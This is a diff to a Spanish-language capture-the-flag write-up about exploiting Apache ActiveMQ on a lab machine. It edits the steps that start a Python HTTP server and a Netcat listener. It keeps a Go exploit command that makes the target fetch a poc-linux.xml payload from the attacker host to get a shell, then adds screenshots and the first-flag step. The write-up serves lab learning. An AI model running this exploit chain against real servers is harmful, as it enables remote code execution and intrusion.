@@ -123,8 +123,8 @@ Apache ActiveMQ® es el intermediario de mensajes basado en Java, multiprotocolo
 **Iniciamos un servidor HTTP Python3 en segundo plano e iniciamos un oyente Netcat.**
 
 ```
-python3 -m http.server &
-nc -lvvp 4444
+python -m http.server 
+nc -lvvp 9001
 ```
 
 **Luego se ejecuta el codigo.**
@@ -132,3 +132,10 @@ nc -lvvp 4444
 ```go
 go run main.go -i 10.10.11.243 -p 61616 -u http://10.10.14.70:8000/poc-linux.xml
 ```
+
+<figure><img src="../../../.gitbook/assets/terminal.png" alt=""><figcaption></figcaption></figure>
+
+**Navegamode por los directorios hasta encontrar user.txt que tiene la primer bandera.**
+
+<figure><img src="../../../.gitbook/assets/Primer.png" alt=""><figcaption></figcaption></figure>
+
